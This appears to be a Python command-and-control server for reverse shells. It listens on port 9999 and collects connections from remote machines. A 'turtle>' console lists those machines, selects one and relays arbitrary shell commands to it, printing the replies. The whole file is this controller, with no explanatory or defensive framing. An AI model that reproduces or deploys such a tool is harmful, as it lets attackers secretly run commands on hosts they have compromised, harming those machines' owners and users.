import socket
import threading
import time
from queue import Queue
host = ""
port = 0
s = None
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_address = []
def createSocket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("socket creation error : "+str(msg))
    
def bindSocket():
    try:
        global host
        global port
        global s
        print("binding the port : "+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("socket binding error : "+str(msg)+"\n"+"Retrying...")
        bindSocket()

def accepting_connection():
    for c in all_connections:
        c.close()
    del(all_connections[:])
    del(all_address[:])
    while(True):
        try:
            conn,address = s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established : "+address[0])
        except:
            print("Error accepting connections")

def startTurtle():
    while(True):
        cmd = input("turtle> ")
        if(cmd=="list"):
            listConnections()
        elif("select" in cmd):
            conn = getTarget(cmd)
            if(conn is not None):
                sendCommandsToTarget(conn)
        else:
            print("Command is not recognised")

def listConnections():
    results = ''
    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201654)
        except:
            del(all_connections[i])
            del(all_address[i])
            continue
        results = str(i)+"   "+str(all_address[i][0])+"    "+str(all_address[i][1])+"\n"
    print("-----clients-----"+"\n"+results)

def getTarget(cmd):
    try:
        target = cmd.replace('select','')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : "+str(all_address[target][0]))
        print(str(all_address[target][0])+">",end = "")
        return conn
    except:
        print("Selection not valid")
        return None

def sendCommandsToTarget(conn):
    while(True):
        try:
            cmd = input()
            if(cmd=="exit"):
                break
            elif(len(str.encode(cmd))>0):
                conn.send(str.encode(cmd))
                clientResponse = str(conn.recv(201654),"utf-8")
                print(clientResponse,end = "")
        except:
            print("Error sending commands")
            break

def createWorkers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target = work)
        t.daemon = True
        t.start()

def work():
    n = 2
    while(n>0):
        x = queue.get()
        print(x)
        if(x==1):
            createSocket()
            bindSocket()
            accepting_connection()
        if(x==2):
            startTurtle()
        queue.task_done()
        n-=1

def createJobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

createJobs()
createWorkers()